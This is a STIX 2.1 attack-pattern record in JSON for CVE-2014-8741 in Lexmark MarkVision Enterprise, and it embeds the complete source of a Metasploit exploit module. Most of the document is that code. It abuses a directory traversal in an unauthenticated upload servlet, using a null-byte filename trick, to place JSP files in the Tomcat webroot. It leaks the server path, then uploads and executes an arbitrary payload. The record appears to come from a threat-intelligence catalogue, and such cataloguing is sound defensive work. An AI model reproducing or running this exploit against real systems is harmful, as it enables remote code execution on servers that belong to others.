{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f9e862b7-9d4f-4e0d-92c7-9a9ad8a597a7",
    "created": "2024-08-14T16:53:20.306497Z",
    "modified": "2024-08-14T16:53:20.306501Z",
    "name": "Lexmark MarkVision Enterprise Arbitrary File Upload",
    "description": " This module exploits a code execution flaw in Lexmark MarkVision Enterprise before version 2.1. A directory traversal vulnerability in the GfdFileUploadServlet servlet allows an unauthenticated attacker to upload arbitrary files, including arbitrary JSP code. This module has been tested successfully on Lexmark MarkVision Enterprise 2.0 with Windows 2003 SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/lexmark_markvision_gfd_upload.rb",
            "external_id": "lexmark_markvision_gfd_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-8741"
        },
        {
            "source_name": "reference",
            "url": "http://support.lexmark.com/index?page=content&id=TE666&locale=EN&userlocale=EN_US"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Lexmark MarkVision Enterprise Arbitrary File Upload',\n      'Description'   => %q{\n        This module exploits a code execution flaw in Lexmark MarkVision Enterprise before version 2.1.\n        A directory traversal vulnerability in the GfdFileUploadServlet servlet allows an unauthenticated\n        attacker to upload arbitrary files, including arbitrary JSP code. This module has been\n        tested successfully on Lexmark MarkVision Enterprise 2.0 with Windows 2003 SP2.\n      },\n      'Author'        =>\n        [\n          'Andrea Micalizzi', # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'       => MSF_LICENSE,\n      'References'    =>\n        [\n          ['CVE', '2014-8741'],\n          ['ZDI', '14-410'],\n          ['URL', 'http://support.lexmark.com/index?page=content&id=TE666&locale=EN&userlocale=EN_US']\n        ],\n      'Privileged'    => true,\n      'Platform'      => 'win',\n      'Arch'          => ARCH_JAVA,\n      'Targets'       =>\n        [\n          [ 'Lexmark Markvision Enterprise 2.0', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-12-09'))\n\n    register_options(\n      [\n        Opt::RPORT(9788),\n        OptString.new('TARGETURI', [true, 'ROOT path', '/'])\n      ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path.to_s, 'mve', 'help', 'en', 'inventory', 'am_about.html')\n    })\n\n    version = nil\n    if res && res.code == 200 && res.body && res.body.to_s =~ /MarkVision Enterprise ([\\d\\.]+)/\n      version = $1\n    else\n      return Exploit::CheckCode::Unknown\n    end\n\n    if Rex::Version.new(version) <= Rex::Version.new('2.0.0')\n      return Exploit::CheckCode::Appears\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    jsp_leak = jsp_path\n    jsp_name_leak = \"#{rand_text_alphanumeric(4 + rand(32 - 4))}.jsp\"\n    # By default files uploaded to C:\\Program Files\\Lexmark\\Markvision Enterprise\\apps\\library\\gfd-scheduled\n    # Default app folder on C:\\Program Files\\Lexmark\\Markvision Enterprise\\tomcat\\webappps\\ROOT\n    traversal_leak = \"/..\\\\..\\\\..\\\\tomcat\\\\webapps\\\\ROOT\\\\#{jsp_name_leak}\\x00.pdf\"\n\n    print_status(\"Uploading info leak JSP #{jsp_name_leak}...\")\n    if upload_file(traversal_leak, jsp_leak)\n      print_good(\"JSP successfully uploaded\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - JSP upload failed\")\n    end\n\n    res = execute(jsp_name_leak)\n\n    if res && res.code == 200 && res.body.to_s !~ /null/ && res.body.to_s =~ /Path:(.*)/\n      upload_path = $1\n      print_good(\"Working directory found in #{upload_path}\")\n      register_file_for_cleanup(::File.join(upload_path, 'webapps', 'ROOT', jsp_name_leak))\n    else\n      print_error(\"Couldn't retrieve the upload directory, manual cleanup will be required\")\n    end\n\n    jsp_payload_name = \"#{rand_text_alphanumeric(4+rand(32-4))}.jsp\"\n    jsp_payload = payload.encoded\n    traversal_payload = \"/..\\\\..\\\\..\\\\tomcat\\\\webapps\\\\ROOT\\\\#{jsp_payload_name}\\x00.pdf\"\n\n    print_status(\"Uploading JSP payload #{jsp_payload_name}...\")\n    if upload_file(traversal_payload, jsp_payload)\n      print_good(\"JSP successfully uploaded\")\n      register_file_for_cleanup(::File.join(upload_path, 'webapps', 'ROOT', jsp_payload_name)) if upload_path\n    else\n      fail_with(Failure::Unknown, \"#{peer} - JSP upload failed\")\n    end\n\n    print_status(\"Executing payload...\")\n    execute(jsp_payload_name, 3)\n  end\n\n  def upload_file(filename, contents)\n    good_signature = rand_text_alpha(4 + rand(4))\n    bad_signature = rand_text_alpha(4 + rand(4))\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(good_signature, nil, nil, 'form-data; name=\"success\"')\n    post_data.add_part(bad_signature, nil, nil, 'form-data; name=\"failure\"')\n    post_data.add_part(contents, 'application/octet-stream', nil, \"form-data; name=\\\"datafile\\\"; filename=\\\"#{filename}\\\"\")\n\n    res = send_request_cgi(\n      {\n        'uri'    => normalize_uri(target_uri.path, 'mve', 'upload', 'gfd'),\n        'method' => 'POST',\n        'data'   => post_data.to_s,\n        'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\"\n      })\n\n    if res && res.code == 200 && res.body && res.body.to_s.include?(good_signature)\n      return true\n    else\n      return false\n    end\n  end\n\n  def execute(jsp_name, time_out = 20)\n    res = send_request_cgi({\n      'uri'    => normalize_uri(target_uri.path.to_s, jsp_name),\n      'method' => 'GET'\n    }, time_out)\n\n    res\n  end\n\n  def jsp_path\n    jsp =<<-EOS\n<%@ page language=\"Java\" import=\"java.util.*\"%>\n<%\nout.println(\"Path:\" + System.getProperty(\"catalina.home\"));\n%>\n    EOS\n\n    jsp\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-12-09",
    "x_mitre_platforms": [
        "win'"
    ]
}